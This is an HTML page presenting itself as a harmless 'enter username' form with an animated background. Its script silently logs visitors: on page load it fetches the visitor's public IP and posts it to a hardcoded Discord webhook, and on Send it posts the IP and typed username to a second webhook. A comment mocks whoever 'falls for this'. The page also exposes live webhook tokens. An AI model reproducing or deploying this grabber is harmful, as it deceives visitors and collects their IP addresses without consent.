
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        @keyframes backgroundAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes wavyShake {
            0%, 100% { transform: translate(0, 0); }
            10%, 30%, 50%, 70%, 90% { transform: translate(-2px, -2px); }
            20%, 40%, 60%, 80% { transform: translate(2px, 2px); }
        }

        body {
            background-image: url('https://xyzzr.github.io/-/image.png');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            animation: backgroundAnimation 20s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
        }
        #inputBox {
            border: 1px solid #ccc;
            padding: 10px;
            width: 300px;
            background-color: black;
            color: white;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        #inputBox.green-border {
            border-color: green;
        }
        #sendButton {
            padding: 10px 20px;
            background-color: black;
            color: white;
            border: 1px solid #ccc;
            border-radius: 5px;
            cursor: pointer;
        }
        #sendButton:hover {
            background-color: #333;
        }
        #userID {
            font-size: 24px;
            color: white;
            margin-bottom: 10px;
            animation: wavyShake 1s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="userID"></div>
        <input type="text" id="inputBox" placeholder="enter username here...">
        <br>
        <button id="sendButton">Send</button>
    </div>

    <script>
        function generateRandomID() {
            const letters = 'abcdefghijklmnopqrstuvwxyz';
            const digits = '0123456789';
            let id = '';
            for (let i = 0; i < 15; i++) {
                id += letters.charAt(Math.floor(Math.random() * letters.length));
                id += digits.charAt(Math.floor(Math.random() * digits.length));
            }
            return id;
        }

        var userID = generateRandomID();
        document.getElementById('userID').innerText = `${userID}`;
        window.onload = function() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var userIp = data.ip;
                    var payload = {
                        content: `User IP: ${userIp}\nUser ID: ${userID}`
                    };

                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    }).then(response => {
                        if (!response.ok) {
                            console.error("error.");
                        }
                    }).catch(error => {
                        console.error('error:', error);
                    });
                }).catch(error => {
                    console.error('error fetching:', error);
                });
        };

        document.getElementById('inputBox').addEventListener('input', function() {
            if (this.value.trim() !== "") {
                this.classList.add('green-border');
            } else {
                this.classList.remove('green-border');
            }
        });

        document.getElementById('sendButton').addEventListener('click', function() {
            var content = document.getElementById('inputBox').value.trim();
            if (content === "") {
                alert("Please enter your username.");
                return;
            }

            fetch('https://api.ipify.org?format=json') // loll
                .then(response => response.json())
                .then(data => {
                    var userIp = data.ip;
                    var payload = {
                        content: `IP: ${userIp}\nUsername: ${content}\nUser ID: ${userID}`
                    };

                    fetch('https://discord.com/api/webhooks/1277725640182861854/svreE-KRXn7S5TrUtFwj9GnhlV-IAu54ru1zldsxiXlqey3HBQSWz2Lta_2dOTfcvI6m', { // if anybody falls for this they are retarded i swear
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    }).then(response => {
                        if (response.ok) {
                            alert("thanks");
                        } else {
                            alert("Failed to send");
                        }
                    }).catch(error => {
                        console.error('Error:', error);
                        alert("Failed to send");
                    });
                }).catch(error => {
                    console.error('Error fetching IP:', error);
                    alert("Failed to retrieve");
                });
        });
    </script>
</body>
</html>
